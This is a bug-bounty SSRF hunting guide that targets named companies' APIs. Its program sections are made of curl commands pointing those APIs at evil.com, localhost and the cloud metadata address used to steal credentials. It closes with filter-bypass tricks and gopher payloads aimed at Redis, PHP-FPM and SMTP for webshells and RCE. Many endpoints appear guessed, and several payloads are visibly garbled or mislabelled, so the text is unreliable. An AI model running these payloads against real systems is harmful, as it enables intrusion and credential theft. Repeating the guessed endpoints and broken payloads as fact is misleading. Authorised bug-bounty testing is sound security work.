# SSRF Hunting Guide - NEW Programs (June 2026)

## 🎯 Target Programs

### Cloud Infrastructure

| Program | Platform | Key Attack Surface |
|---------|----------|-------------------|
| **HashiCorp** (Vault, Consul, Nomad) | HackerOne | UI Config Import, Remote Agent APIs |
| **Fastly** | HackerOne | Purge API, Origin Request headers |
| **PagerDuty** | Bugcrowd | Webhook configs, integrations |
| **Grafana Labs** | Intigriti | Data source proxy, dashboard imports |

### AI/ML

| Program | Platform | Key Attack Surface |
|---------|----------|-------------------|
| **Hugging Face** | HackerOne | Spaces, Model fetch, Webhook callbacks |
| **Mistral AI** | HackerOne VDP | AI API endpoints |

### Crypto/Web3

| Program | Platform | Key Attack Surface |
|---------|----------|-------------------|
| **Stellar SDF** | HackerOne | Webhooks, RPC node configuration |
| **Chainlink** | Immunefi | Oracle data provider URLs |
| **Solana** | Immunefi | RPC nodes, webhook triggers |

### IoT/Embedded

| Program | Platform | Key Attack Surface |
|---------|----------|-------------------|
| **Tesla** | Bugcrowd | Infotainment, Fleet management APIs |
| **Cisco** | HackerOne | Web UIs, Meraki/ThousandEyes APIs |
| **Canonical** | VDP | Landscape, Snap store, IoT snapshots |
| **TeamViewer** | YesWeHack | Session management, webhooks |
| **Ledger** | YesWeHack | Wallet sync, backend APIs |
| **Keycloak** | YesWeHack | Identity brokering, config imports |
| **Orange** | YesWeHack | Customer portals, provisioning APIs |
| **Revolut** | Intigriti | Banking integrations, webhooks |

---

## 🚀 SSRF Testing Methodology

### Phase 1: Reconnaissance

```bash
# หา endpoints ที่รับ URL
# Common patterns:
# - /import?url=
# - /fetch?url=
# - /proxy?url=
# - /webhook?callback_url=
# - /preview?url=
# - /thumbnail?url=

# ใช้ ffuf หรือ dirb หา endpoints
ffuf -w /usr/share/wordlists/dirb/common.txt -u "https://TARGET/FUZZ" -recursion
```

### Phase 2: SSRF Probing

```bash
# 1. Basic SSRF test - ลองให้ server fetch internal resource
curl -v "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/" 

# 2. DNS Rebinding test
curl -v "https://TARGET/api/fetch?url=http://attacker-controlled-domain.com"

# 3. Localhost probing
curl -v "https://TARGET/api/fetch?url=http://127.0.0.1:8080/admin"

# 4. Cloud metadata (AWS/GCP/Azure)
curl -v "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 5. Internal service scanning
for port in 22 80 443 8080 8443 27017 6379; do
  curl -v "https://TARGET/api/fetch?url=http://127.0.0.1:$port/" 2>/dev/null
done
```

### Phase 3: OAST Testing (Critical!)

```bash
# ใช้ Burp Collaborator หรือ Interactsh
# สร้าง payload:
# http://YOUR_COLLABORATOR_ID.burpcollaborator.net
# YOUR_SUBDOMAIN.interactsh.com

curl -v "https://TARGET/api/fetch?url=http://COLLABORATOR.oast.online"
```

---

## 🎯 Program-Specific Testing

### HashiCorp (Vault/Consul/Nomad)

**Attack Vectors:**
- Config import: `/sys/config/raft` or `/v1/sys/config/audit`
- Agent communication APIs
- UI template fetching

**Test Commands:**
```bash
# Vault - Config import SSRF
curl -X POST "https://vault-target.com/v1/sys/config/raft" -d '{"leader_api_addr": "http://evil.com"}'

# Consul - Config import
curl -X PUT "https://consul-target.com/v1/config" -d @http://evil.com/config.json

# Nomad - Job submission from URL
curl -X POST "https://nomad-target.com/v1/jobs" -d '{"Job": {"ID": "test", "Payload": "http://evil.com/job.hcl"}}'
```

**Impact:** Cloud metadata access, internal service enumeration, secrets theft from Vault

---

### Fastly

**Attack Vectors:**
- Purge API: `/purge`
- Origin header manipulation
- Request signing bypass

**Test Commands:**
```bash
# Test purge endpoint
curl -X POST "https://api.fastly.com/purge/YOUR_DOMAIN" -H "Fastly-Key: YOUR_KEY"

# Test origin request with manipulated Host header
curl -v -H "Host: internal-admin.fastly.net" "https://fastly-customer.com/"

# Test surrogate key based on internal origin
curl -X POST "https://api.fastly.com/service/SERVICE_ID/purge" -d '{"surrogate_keys": "internal-key"}'
```

**Impact:** Cache poisoning, internal resource access

---

### Grafana Labs

**Attack Vectors:**
- Data source URL configuration
- Dashboard import from URL
- Plugin installation from URL

**Test Commands:**
```bash
# Test data source proxy (classic SSRF)
curl -v "https://grafana-target.com/api/ds/query" -H "Content-Type: application/json" -d '{
  "queries": [{"refId": "A", "datasource": {"type": "prometheus", "uid": "prometheus"}, "expr": "up", "url": "http://169.254.169.254/latest/meta-data/"} }]
}'

# Dashboard import SSRF
curl -X POST "https://grafana-target.com/api/dashboards/import" -d '{"dashboard": {"title": "Test"}, "uploadUrl": "http://evil.com/dashboard.json"}'

# Plugin install SSRF
curl -X POST "https://grafana-target.com/api/plugins/install" -d '{"url": "http://evil.com/plugin.zip"}'
```

**Impact:** Cloud metadata, internal service access, credential theft

---

### Hugging Face

**Attack Vectors:**
- Model fetch from URL
- Space webhook callbacks
- Dataset loading from external URL

**Test Commands:**
```bash
# Model fetch SSRF
curl -X POST "https://huggingface.co/api/models" -d '{"modelUrl": "http://169.254.169.254/latest/meta-data/"}'

# Space webhook configuration
curl -X POST "https://huggingface.co/api/spaces/SpaceName/secrets" -d '{"key": "WEBHOOK_URL", "value": "http://evil.com/callback"}'

# Dataset loading
curl -X POST "https://huggingface.co/api/datasets/upload" -d '{"datasetUrl": "http://evil.com/data.zip"}'
```

**Impact:** Internal container network access, cloud credentials

---

### Chainlink

**Attack Vectors:**
- Oracle job configuration
- External adapter URLs
- Data provider URL manipulation

**Test Commands:**
```bash
# Test oracle job creation with internal URL
curl -X POST "https://chainlink-target.com/v2/jobs" -d '{
  "initiators": [{"type": "ethlog"}],
  "tasks": [{"type": "httpget", "params": {"get": "http://169.254.169.254/latest/meta-data/"}}]
}'

# External adapter SSRF
curl -X POST "https://chainlink-target.com/v2/specs" -d '{"tasks": [{"type": "bridge", "params": {"name": "test", "url": "http://evil.com/bridge"}}]}'
```

**Impact:** Oracle manipulation, internal network scanning

---

### Stellar SDF

**Attack Vectors:**
- Horizon API webhook configuration
- Txstatus endpoint
- Asset issuance endpoints

**Test Commands:**
```bash
# Webhook configuration SSRF
curl -X POST "https://stellar-target.com/webhook" -d '{"url": "http://127.0.0.1:8000/internal"}'

# Transaction endpoint with URL parameter
curl -v "https://stellar-target.com/tx?blob=http://evil.com/tx.txt"
```

**Impact:** Internal RPC access, transaction manipulation

---

### PagerDuty

**Attack Vectors:**
- Webhook configuration endpoints
- Integration URL settings
- Notification callbacks

**Test Commands:**
```bash
# Webhook configuration SSRF
curl -X POST "https://api.pagerduty.com/webhooks" \
  -H "Content-Type: application/json" \
  -d '{"webhook": {"url": "http://evil.com/callback", "events": ["incident.triggered"]}}'

# Integration URL SSRF
curl -X POST "https://api.pagerduty.com/services" \
  -H "Content-Type: application/json" \
  -d '{"service": {"name": "test", "integration_url": "http://127.0.0.1:8080/internal"}}'

# Custom webhook URL test
curl -X PUT "https://api.pagerduty.com/webhooks/WEBHOOK_ID" \
  -d '{"webhook": {"url": "http://169.254.169.254/latest/meta-data/"}}'
```

**Impact:** Internal service access, incident manipulation

---

### Solana

**Attack Vectors:**
- RPC node configuration
- Webhook triggers for transactions
- Program subscription endpoints

**Test Commands:**
```bash
# RPC node health check SSRF
curl -X POST "https://solana-target.com/health" -d '{"url": "http://127.0.0.1:8899"}'

# Transaction subscription webhook
curl -X POST "https://solana-target.com/api/webhooks" \
  -d '{"endpoint": "http://evil.com/solana-tx", "lastSlot": 100000000}'

# Program subscription with URL
curl -X POST "https://solana-target.com/v1/programs/subscribe" \
  -d '{"programId": "Program123", "addresses": ["http://evil.com/addrs.txt"]}'
```

**Impact:** Internal RPC access, validator manipulation

---

### Cisco (Meraki/ThousandEyes)

**Attack Vectors:**
- Meraki Dashboard API
- ThousandEyes test configuration
- Network device web interfaces

**Test Commands:**
```bash
# Meraki - Organization SSRF (if accessible)
curl -X GET "https://api.meraki.com/api/v1/organizations" -H "X-Cisco-Meraki-API-Key: YOUR_KEY"

# ThousandEyes - Test configuration SSRF
curl -X POST "https://api.thousandeyes.com/v6/tests" \
  -d '{"test": {"name": "SSRF Test", "url": "http://169.254.169.254/latest/meta-data/"}}'

# Meraki - Camera snapshot URL SSRF
curl -X POST "https://api.meraki.com/api/v1/devices/SERIAL/camera/generateSnapshot" \
  -d '{"url": "http://evil.com/snapshot.jpg"}'

# Meraki - Switch port configuration fetch
curl -X POST "https://api.meraki.com/api/v1/devices/SERIAL/switch/ports/cleanup" \
  -d '{"url": "http://evil.com/config.xml"}'
```

**Impact:** Cloud credentials, internal network access, camera feeds

---

### Canonical (VDP - Limited/No Bounty)

**Attack Vectors:**
- Landscape web UI (LXD, Maas)
- Snap store metadata processing
- IoT device management

**Test Commands:**
```bash
# Landscape - Machine import from URL
curl -X POST "https://landscape.canonical.com/api/machines/import" \
  -d '{"url": "http://evil.com/machines.csv"}'

# Snap store - Snap declaration fetch
curl -X POST "https://api.snapcraft.io/v2/snaps/declare" \
  -d '{"url": "http://evil.com/declaration.yaml"}'

# Ubuntu SSO - Avatar fetch SSRF
curl -X POST "https://login.ubuntu.com/api/v2/preferences/avatar" \
  -d '{"avatar_url": "http://127.0.0.1:8080/avatar.jpg"}'
```

**⚠️ Note:** This is a VDP - bounty may be limited or none

---

### Mistral AI (VDP - Limited/No Bounty)

**Attack Vectors:**
- Model inference endpoints
- API documentation fetching
- Webhook callbacks for async operations

**Test Commands:**
```bash
# Model fetch SSRF (if feature exists)
curl -X POST "https://api.mistral.ai/v1/fetch" \
  -d '{"model_url": "http://evil.com/model.zip"}'

# Chat completion with external data
curl -X POST "https://api.mistral.ai/v1/chat/completions" \
  -d '{"context_url": "http://127.0.0.1:8000/context.txt"}'

# Document parsing webhook
curl -X POST "https://api.mistral.ai/v1/documents/parse" \
  -d '{"source_url": "http://evil.com/doc.pdf"}'
```

**⚠️ Note:** This is a VDP - bounty may be limited or none

---

### Tesla

**Attack Vectors:**
- Infotainment system web interface
- Fleet management API
- Partner integration endpoints

**Test Commands:**
```bash
# Vehicle API SSRF (if accessible)
curl -v "https://tesla-api.target.com/vehicles/123/service/ping?url=http://127.0.0.1"

# Fleet management
curl -X POST "https://fleet.tesla.com/api/vehicles" -d '{"vinUrl": "http://evil.com/vin.txt"}'
```

---

### Revolut

**Attack Vectors:**
- Profile picture upload (via URL)
- Webhook configuration
- Card generation API

**Test Commands:**
```bash
# Profile picture SSRF
curl -X POST "https://api.revolut.com/api/user/profile/picture" -d '{"pictureUrl": "http://169.254.169.254/latest/meta-data/"}'

# Webhook SSRF
curl -X POST "https://api.revolut.com/api/webhook" -d '{"url": "http://evil.com/webhook"}'

# Card design upload
curl -X POST "https://api.revolut.com/api/cards/design" -d '{"designUrl": "http://evil.com/design.png"}'
```

**Impact:** Banking data access, internal APIs

---

### TeamViewer

**Attack Vectors:**
- Remote access session management
- Integration webhook URLs
- Meeting scheduler endpoints

**Test Commands:**
```bash
# Remote connection history fetch
curl -X GET "https://webapi.teamviewer.com/api/v1/sessions" -H "Bearer: YOUR_TOKEN"

# File transfer webhook SSRF
curl -X POST "https://webapi.teamviewer.com/api/v1/integrations/webhook" \
  -d '{"url": "http://127.0.0.1:8080/webhook", "event": "session.started"}'

# Screen sharing callback
curl -X POST "https://webapi.teamviewer.com/api/v1/screenshare/callback" \
  -d '{"callbackUrl": "http://169.254.169.254/latest/meta-data/"}'
```

**Impact:** Internal corporate network access via TeamViewer session

---

### Ledger

**Attack Vectors:**
- Wallet device synchronization
- Live apps repository
- Backend API for firmware updates

**Test Commands:**
```bash
# Device sync SSRF
curl -X POST "https://api.ledger.com/v1/devices/sync" \
  -d '{"syncUrl": "http://127.0.0.1:8080/sync"}'

# Firmware update URL
curl -X POST "https://api.ledger.com/v1/firmware/update" \
  -d '{"firmwareUrl": "http://evil.com/firmware.bin"}'

# Live apps repository
curl -X POST "https://api.ledger.com/v1/apps/repository" \
  -d '{"appListUrl": "http://evil.com/apps.json"}'
```

**Impact:** Crypto wallet compromise, firmware manipulation

---

### Keycloak

**Attack Vectors:**
- Identity brokering configuration
- Theme/template import
- Client registration endpoints

**Test Commands:**
```bash
# Identity provider import SSRF
curl -X POST "https://keycloak-target.com/auth/admin/realms/master/identity-provider/import" \
  -d '{"fromUrl": "http://evil.com/idp-metadata.xml"}'

# Client template import
curl -X POST "https://keycloak-target.com/auth/admin/realms/master/client-templates" \
  -d '{"codeUrl": "http://127.0.0.1:8080/template.ftl"}'

# Theme import SSRF
curl -X POST "https://keycloak-target.com/auth/admin/realms/master/themes" \
  -d '{"themeUrl": "http://evil.com/theme.zip"}'
```

**Impact:** Identity theft, SSO bypass, credential theft

---

### Orange (Telecom)

**Attack Vectors:**
- Customer portal file imports
- Provisioning API endpoints
- Mobile app backend

**Test Commands:**
```bash
# Invoice import SSRF
curl -X POST "https://api.orange.com/customer/invoice/import" \
  -d '{"invoiceUrl": "http://127.0.0.1:8080/invoice.pdf"}'

# SIM provisioning SSRF
curl -X POST "https://api.orange.com/provisioning/sim" \
  -d '{"profileUrl": "http://evil.com/profile.xml"}'

# Mobile app update check
curl -X GET "https://api.orange.com/mobile/app/check" \
  -H "X-Update-Url: http://evil.com/update.json"
```

**Impact:** Customer data access, telecom infrastructure

---

## 🛡️ SSRF Bypass Techniques

| Technique | Example | Use Case |
|-----------|---------|----------|
| **IP Encoding** | `127.0.0.1` → `2130706433` or `0x7f.0x00.0x00.0x01` | Bypass localhost filter |
| **DNS Rebinding** | Use domain that resolves to external then internal | Bypass IP whitelist |
| **URL Fragment** | `http://evil.com#@127.0.0.1` | Bypass parse confusion |
| **Protocol switching** | `dict://127.0.0.1:6379/` | Redis/SMTP SSRF |
| **Gopher Protocol** | `gopher://127.0.0.1:6379/_INFO` | Redis SSRF, RCE chains |
| **IPv6** | `http://[::1]/` or `http://[0::1]/` | Bypass IPv4 filters |
| **Redirect** | Make server follow redirect to internal | Bypass direct SSRF blocks |
| **CRLF Injection** | `http://evil.com/%0d%0aHost:%20internal` | HTTP header injection |
| **Double URL Encode** | `%252e%252e%252f` = `../` | Bypass WAF filters |
| **127.1** | `127.1` = `127.0.0.1` | Short form bypass |

---

## 📊 Impact Demonstration

### Critical SSRF (Cloud Metadata)

```bash
# AWS metadata access
curl "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response example (if vulnerable):
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }
```

### High SSRF (Internal Service Access)

```bash
# Access internal admin panel
curl "https://TARGET/api/fetch?url=http://localhost:8080/admin"

# Redis access via dict protocol
curl "https://TARGET/api/fetch?url=dict://localhost:6379/"
```

### Critical SSRF - Gopher Protocol (RCE Chains)

```bash
# Redis reverse shell via gopher
curl "https://TARGET/api/fetch?url=gopher://127.0.0.1:6379/_INFO"

# Redis wrote webshell (if accessible)
curl "https://TARGET/api/fetch?url=gopher://127.0.0.1:6379/_SET%20eval%20require(%27fs%27).writeFileSync(%22shell.php%22,request.body)%200%0"

# Attack PHP-FPM (port 9000)
curl "https://TARGET/api/fetch?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%14%00%00%00%01%01%00%00%00%00%00%00"

# SMTP internal relay
curl "https://TARGET/api/fetch?url=gopher://127.0.0.1:25/_MAIL%20FROM:%3Cevil@attacker.com%3E%0ARCPTTO:%3Cvictim@target.com%3E"
```

**⚠️ Note:** Gopher SSRF is one of the most powerful SSRF techniques - can lead to RCE via Redis or internal service exploitation.

---

## 📋 SSRF Testing Checklist

- [ ] Identify all URL/URI accepting endpoints
- [ ] Test with `http://127.0.0.1` and `http://localhost`
- [ ] Test cloud metadata endpoint `169.254.169.254`
- [ ] Test DNS rebinding (point to external then internal IP)
- [ ] Use OAST (Burp Collaborator/Interactsh) for blind SSRF
- [ ] Test with protocol `dict://`, `gopher://`, `ftp://`
- [ ] Test IP encoding bypasses
- [ ] Test for CRLF injection in headers
- [ ] Document impact with screenshots/requests
- [ ] Check program policy for scope/exclusions

---

## 💰 Expected Payout Ranges

| Impact Level | Payout | Example |
|--------------|--------|---------|
| Low (localhost access only) | $100-$500 | Port scanning internal services |
| Medium (internal service interaction) | $500-$2,000 | Access to admin panel, Redis |
| High (cloud metadata access) | $2,000-$10,000 | AWS credentials, IAM roles |
| Critical (data exfiltration) | $5,000-$25,000+ | PII access, financial data, RCE chain |

---

## 🔗 Resources

- PortSwigger Web Academy: SSRF
- PayloadsAllTheThings: SSRF
- HackerOne Hacktivity: Search "SSRF" + program name
- Orange Tsai's SSRF research